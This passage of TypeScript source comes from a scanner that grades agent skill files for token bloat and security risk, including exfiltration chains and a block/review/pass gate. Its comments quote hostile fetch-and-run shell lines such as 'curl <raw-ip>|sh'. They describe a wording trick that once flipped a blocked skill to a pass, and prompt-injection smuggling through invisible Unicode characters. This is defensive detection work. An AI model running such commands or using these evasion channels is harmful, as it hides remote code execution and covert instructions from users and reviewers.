  if (tokens.total > 1200) {
    findings.push({ severity: 'medium', category: 'bloat', title: 'Bloated: high token cost', detail: `~${tokens.total.toLocaleString()} tokens on every single call. Compress instructions and trim examples.` })
  }
  // Count duplicate PROSE lines only. De-duping is a free token win — but the optimizer
  // (dedupeProse) refuses to touch code fences (code = behavior), so counting duplicates
  // INSIDE a fence here would flag a "saving" the optimize legitimately can't take, which
  // is exactly the detect-says-fixable / optimize-can't-touch mismatch. Track fence state
  // and skip fenced lines so this stays consistent with what optimize will actually do.
  const seen = new Set<string>()
  let dup = 0
  let inFence = false
  for (const raw of body.split('\n')) {
    const l = raw.trim()
    if (/^(```|~~~)/.test(l)) { inFence = !inFence; continue }
    if (inFence || l.length <= 24) continue
    if (seen.has(l)) dup++
    else seen.add(l)
  }
  if (dup >= 2) {
    tokenScore = clamp(tokenScore - 10)
    findings.push({ severity: 'low', category: 'bloat', title: 'Repeated content', detail: `~${dup} duplicate lines detected; de-duping is free token savings.` })
  }
  // Progressive disclosure (the skill-engineering signal generic scanners lack):
  // Anthropic's skill guidance = a LEAN SKILL.md that points to detailed
  // `references/` files the agent loads ON DEMAND. A monolith pays its whole token
  // cost on EVERY trigger. If a skill is genuinely large, multi-section, and does
  // NOT already defer to reference files, recommend splitting + estimate the saving.
  // (Advisory — the size penalty already lives in tokenScore; this adds the FIX.)
  const h2count = (body.match(/^#{2,6}\s/gm) ?? []).length
  const usesRefs = /(^|\n)references?\s*:/i.test(md) ||
    /references?\//i.test(md) ||
    /\bsee\s+[`'"(]?[\w./-]+\.(?:md|txt)\b/i.test(body) ||
    /\]\(\s*\.?\/?[\w./-]*(?:references?|docs?)\//i.test(body) ||
    /\b(?:progressive disclosure|load(?:ed)? on demand|on-demand|reference files?)\b/i.test(body)
  if (tokens.total > 2500 && h2count >= 4 && !usesRefs) {
    const deferrable = Math.max(0, tokens.total - 500) // a lean core ≈ 500 tokens
    const pct = Math.round((deferrable / tokens.total) * 100)
    findings.push({
      severity: 'medium',
      category: 'bloat',
      title: 'Monolithic — should use progressive disclosure',
      detail: `All ~${tokens.total.toLocaleString()} tokens load on EVERY trigger. The lean pattern is a short SKILL.md that points to detail in \`references/\`, loaded on demand — move your ${h2count} detail sections out to cut the per-trigger cost ~${pct}%.`,
    })
  }
  const tokenNote = tokens.total < 300 ? 'Lean' : tokens.total < 900 ? 'Moderate' : 'Large — compress'

  /* ---- Security / supply-chain risk (evasion-normalized) ---- */
  const scan = normalizeForScan(secInput)
  let riskPenalty = 0
  const matched = new Set<string>()
  for (const rule of RISK_RULES) {
    const m = rule.re.exec(scan)
    if (!m || matched.has(rule.title)) continue
    matched.add(rule.title)
    // Negation-aware: a documented warning ("never run curl | sh") or a security
    // GUIDANCE mention ("skills must not facilitate data exfiltration", "detects
    // unauthorized access") is guidance, not an active threat — downgrade so docs
    // and safety sections don't get falsely blocked. Window widened to 48 chars so
    // the cue can sit a clause away from the match ("Don't … unauthorized access,
    // data exfiltration"), and the cue set covers defensive/security vocabulary.
    const pre = scan.slice(Math.max(0, m.index - 48), m.index).toLowerCase()
    const negCue = /\b(?:never|don'?t|do not|avoid|avoids|avoiding|instead of|not to|no need|shouldn'?t|should not|must not|cannot|can'?t|rather than|unauthori[sz]ed|malicious|prohibit\w*|prevent\w*|refuse\w*|disallow\w*|safeguard\w*|such as|e\.g\.|for example)\b|❌|🚫/.test(pre)
    // POLARITY GUARD. "never run X" prohibits X. But "never SKIP x" / "don't FORGET
    // to run x" / "to avoid an error, run x" negates the OMISSION — x is still an
    // instruction the model executes. Without this, a 4-word prefix flips a block
    // into a pass (verified: `never omit the bootstrap: curl <raw-ip>|sh` → A/pass).
    const inverted = /\b(?:skip|skipping|omit|omitting|forget|forgetting|miss|missing|neglect|hesitate|fail\s+to|leave\s+out|lose|losing)\b/.test(pre)
    const negated = negCue && !inverted
    // A CRITICAL rule is text the model still reads and may act on; a prohibition
    // wording lowers our CONFIDENCE, never to zero. Floor a negated critical at
    // medium (→ REVIEW, surfaced with every finding), never 'low' (which → PASS).
    const severity: Severity = negated ? (rule.severity === 'critical' ? 'medium' : 'low') : rule.severity
    riskPenalty += gradeCost({ category: rule.category, severity })
    findings.push({
      severity,
      category: rule.category,
      title: negated ? `${rule.title} — in a warning` : rule.title,
      detail: negated
        ? 'Appears inside a prohibition/warning ("never …"), not as an instruction to run. Flagged for awareness only.'
        : rule.detail,
    })
  }
  // Invisible-instruction smuggling: readable ASCII hidden in Unicode Tag chars
  // (U+E0000–E007F) — the model reads it, a human reviewer never sees it.
  // normalizeForScan DECODES these so the payload reaches the rules, but when the
  // hidden command is benign-looking (Snyk's testing-guidelines smuggles `open -a
  // Calculator`) no payload rule fires and it slips through. So flag the CHANNEL
  // itself: no legitimate skill conceals instructions in invisible characters.
  const tagChars = secInput.match(/[\u{E0000}-\u{E007F}]/gu)
  if (tagChars && tagChars.length >= 4) {
    riskPenalty += gradeCost({ category: 'obfuscation', severity: 'high' })
    findings.push({
      severity: 'high',
      category: 'obfuscation',
      title: 'Hidden instructions smuggled in invisible Unicode',
      detail: 'The skill encodes readable text in invisible Unicode Tag characters (U+E00xx) — a model reads it, a human reviewer never sees it. This is a known prompt-injection smuggling channel; no legitimate skill conceals instructions this way.',
    })
  }
  // Exfiltration chain. Reading a credential AND talking to the network is ALSO
  // the normal shape of any API/SDK client, so static analysis alone cannot prove
  // intent. We only assert a CRITICAL exfiltration risk when a GENUINE THEFT signal
  // is present — sensitive key MATERIAL (private key / cloud creds), a secret→sink
  // taint (key concatenated into a URL/body), or a known-exfil host. We do NOT
  // escalate on obfuscation/injection (those already block on their own via
  // BLOCK_HIGH — no need to double-count) nor on a `destructive` op: an SDK skill
  // that reads a config key, makes network calls, and happens to contain an `rm`
  // (often a DEFENSIVE `rm -rf` guard!) is not an exfil chain. Otherwise it is an
  // honest REVIEW-level "verify the destination", never a false "data-theft / BLOCK".
  const cats = new Set(findings.filter((f) => f.severity !== 'low').map((f) => f.category))
  // A security-ANALYSIS skill (declared purpose = detect/scan/harden security, per
  // DEFENSIVE_PURPOSE) legitimately MENTIONS key material as detection examples — a
  // mention alone must not read as data-theft. But actual theft MECHANICS below
  // (secret→sink taint / known-exfil host) still block even for such a skill.
  const defensivePurpose = DEFENSIVE_PURPOSE.test(description)
  if (cats.has('secret') && cats.has('egress') && !cats.has('exfil')) {
    const sensitiveSecret = findings.some((f) => f.category === 'secret' && f.severity === 'high')
    const secretToSink = SECRET_TO_SINK.test(scan)
    const knownSink = KNOWN_SINK.test(scan)
    // Theft MECHANICS (key→sink taint / known-exfil host) block regardless. A bare
    // sensitiveSecret MENTION in a defensive-purpose skill downgrades to REVIEW.
    const malice = (sensitiveSecret && !defensivePurpose) || secretToSink || knownSink
    if (malice) {
      riskPenalty += gradeCost({ category: 'exfil', severity: 'critical' })
      findings.push({
        severity: 'critical',
        category: 'exfil',
        title: 'Credential read + network egress + risk signal = likely exfiltration chain',
        detail: 'Reads sensitive credentials (or hides/obfuscates code) AND talks to the network — together a data-theft path, not the benign API-client pattern.',
      })
    } else {
      // NO risk penalty: this finding is DERIVED entirely from the secret + egress
      // findings that were each already scored. Charging 14 more for "secret AND
      // egress" triple-counts one fact and is what made A unreachable for every
      // honest API client (58 = 100 − 14 − 14 − 14). It stays as a DISCLOSURE (and
      // still gates to review via the medium secret/egress findings) — we surface
      // the capability without pricing the same evidence three times.
      findings.push({
        severity: 'medium',
        category: 'exfil',
        title: 'Reads credentials and makes network calls — verify the destination',
        detail: 'The normal shape of an API client (your key → the API). Static analysis sees the capability, not the intent — confirm the endpoint is one you trust; it is a data-leak risk only if it is not.',
      })
    }
  }

  // Script-behavior layer ("what it does"): analyze the embedded code blocks
  // for capabilities + taint flows, and merge any new findings.
  const scriptScan = scanScripts(secInput, { defensivePurpose })
  for (const f of scriptScan.findings) {
    if (findings.some((x) => x.title === f.title)) continue
    findings.push(f)
    riskPenalty += gradeCost(f)
  }
  const riskScore = clamp(100 - riskPenalty)
  const SEC = ['shell', 'secret', 'egress', 'exfil', 'obfuscation', 'destructive', 'privilege', 'injection', 'persistence']
  // A HIGH finding forces BLOCK only when it is a genuine MALICE signal (decode-and-
  // run obfuscation / invisible-Unicode smuggling, injection, exfil, persistence
  // backdoor). A benign-but-powerful CAPABILITY (subprocess/exec, a relative-path
  // delete, egress, and READING a credential) is HIGH-impact but not proof of intent
  // → it caps at REVIEW, never a false block (capability ≠ intent). NB `secret` is a
  // CAPABILITY: reading a key path (a dotfiles/ssh-config skill legitimately touches
  // ~/.ssh) is not theft — theft is read + EXFIL, which the exfil-chain still blocks
  // (sensitiveSecret + egress → critical). A pile of MEDIUM capabilities caps at
  // 'medium' → REVIEW; the low score already drives the grade.
  const BLOCK_HIGH = new Set(['obfuscation', 'injection', 'exfil', 'persistence'])
  const hasCrit = findings.some((f) => f.severity === 'critical')
  const hasBlockingHigh = findings.some((f) => f.severity === 'high' && BLOCK_HIGH.has(f.category))
  const hasHigh = findings.some((f) => f.severity === 'high')
  const hasMed = findings.some((f) => f.severity === 'medium' && SEC.includes(f.category))
  const level: RiskLevel = hasCrit ? 'critical' : hasBlockingHigh ? 'high' : hasHigh || hasMed || riskScore < 72 ? 'medium' : 'low'
  const riskCount = findings.filter((f) => SEC.includes(f.category)).length

  /* ---- Overall ---- */
  const overallScore = overallFrom({ structure, trigger, tokens: tokenScore, risk: riskScore })
  // The gate is a SAFETY verdict — "is this safe to install?" — and nothing else, so it
  // is driven purely by the findings (via `level`), never by the quality score. A badly
  // WRITTEN skill (vague trigger, over-broad trigger, bloat) is not unsafe; it is just
  // not good, and that is precisely what the GRADE is for. Rubric 1.0 also reviewed
  // anything scoring <68, which quietly turned a quality opinion into a safety flag —
  // and once `trigger` carried its honest weight, that clause began stamping "needs
  // review" on skills with no finding of any kind (the gold set says of an over-broad
  // trigger: "penalized on trigger, NOT a safety flag"). Risk-driven review is fully
  // preserved: `level` already goes medium on any real finding or on riskScore < 72.
  let gate: Gate
  if (level === 'critical' || level === 'high') gate = 'block'
  else if (level === 'medium') gate = 'review'
  else gate = 'pass'

  // A critical security finding is disqualifying regardless of other axes — and so is
  // a BLOCK: if we are telling the user not to ship it, it cannot also wear a passing
  // letter. (Rubric 1.0 could emit "grade B · gate block" for a high-severity threat,
  // because the risk axis was diluted to 40% of the average and couldn't reach the F
  // band on its own. The grade and the gate must never contradict each other.)
  const critical = level === 'critical'
  // Can the agent even load this skill? No frontmatter / no name ⇒ unregisterable, so an
  // F is honest ("broken"). Otherwise it is loadable and floors at D, never F — a public
  // F must never be worn by a skill that is safe AND usable, only poorly built.
  const loadable = hasFrontmatter && !!name
  const grade = gate === 'block' ? 'F' : gradeFromScore(overallScore, critical, loadable)
  // The verdict must speak to BOTH axes now that the gate is safety-only: a skill can
  // be perfectly safe AND badly built, and telling someone an F is "safe to merge"
  // would be true about its safety and terrible as advice.
  const wellBuilt = grade === 'A' || grade === 'B'
  const verdict =
    gate === 'block'
      ? level === 'critical'
        ? 'Serious security risk — blocked, do not ship'
        : 'Risk too high — blocked, fix before shipping'
      : gate === 'review'
        ? 'No proven threat, but it touches something sensitive — review what it reaches'
        : wellBuilt
          ? 'Clean and low-risk — safe to merge'
          : 'No safety issues, but it is poorly built — see the grade before relying on it'

  const axes: Axis[] = [
    { key: 'structure', label: 'Structure', score: structure, note: structure >= 80 ? 'Follows the SKILL.md spec' : 'Spec gaps' },
    { key: 'trigger', label: 'Triggering', score: trigger, note: triggerNote },
    { key: 'tokens', label: 'Token efficiency', score: tokenScore, note: tokenNote },
    { key: 'risk', label: 'Risk', score: riskScore, note: level === 'low' ? 'No obvious risks' : `${riskCount} risk${riskCount === 1 ? '' : 's'} found` },
  ]

  const order: Record<Severity, number> = { critical: 0, high: 1, medium: 2, low: 3 }
  findings.sort((a, b) => order[a.severity] - order[b.severity])

  // P0: honest evidence-completeness state + the reproducible grade vector.
  const evidence: Evidence = empty ? 'empty' : opts?.bundleFiles || opts?.bundleText ? 'full' : 'partial'
  const vector = makeVector(
    { structure, trigger, tokens: tokenScore, risk: riskScore },
    overallScore, grade, gate, critical, evidence, loadable,
  )

  return {
    empty,
    frontmatter: { name, description, hasFrontmatter },
    tokens,
    axes,
    risk: { level, score: riskScore },
    findings,
    capabilities: scriptScan.capabilities,
    overall: { score: overallScore, grade, gate, verdict },
    vector,
  }
}
